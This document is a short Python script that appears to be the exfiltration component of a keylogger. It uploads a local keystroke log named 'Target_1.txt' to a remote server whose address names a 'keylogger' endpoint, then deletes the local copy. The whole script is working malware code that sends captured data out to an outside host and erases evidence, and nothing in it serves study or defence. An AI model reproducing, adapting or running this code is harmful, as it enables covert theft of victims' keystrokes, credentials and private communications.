import os
import requests

API_ENDPOINT = "https://keylogger-production-3a51.up.railway.app/logs"
LOG_FILE = "Target_1.txt"
MAX_SIZE = 10 * 1024 * 1024  # 10MB limit for local log file

def send_logs():
    if os.path.exists(LOG_FILE):
        file_size = os.path.getsize(LOG_FILE)
        if file_size > MAX_SIZE:
            print(f"Log file size exceeds {MAX_SIZE / 1024 / 1024} MB. Cannot send.")
            return

        # Open the file and send it to the server
        with open(LOG_FILE, "rb") as f:
            files = {'file': (LOG_FILE, f)}
            try:
                response = requests.post(API_ENDPOINT, files=files)
                print(f"Server response: {response.status_code} - {response.text}")
                if response.status_code == 200:
                    # Delete the log file after successful upload
                    os.remove(LOG_FILE)
                    print(f"Deleted local log file: {LOG_FILE}")
                else:
                    print(f"Failed to upload logs: {response.status_code}")
            except Exception as e:
                print(f"Error sending logs: {e}")
    else:
        print("Log file not found. Nothing to send.")

if __name__ == "__main__":
    send_logs()
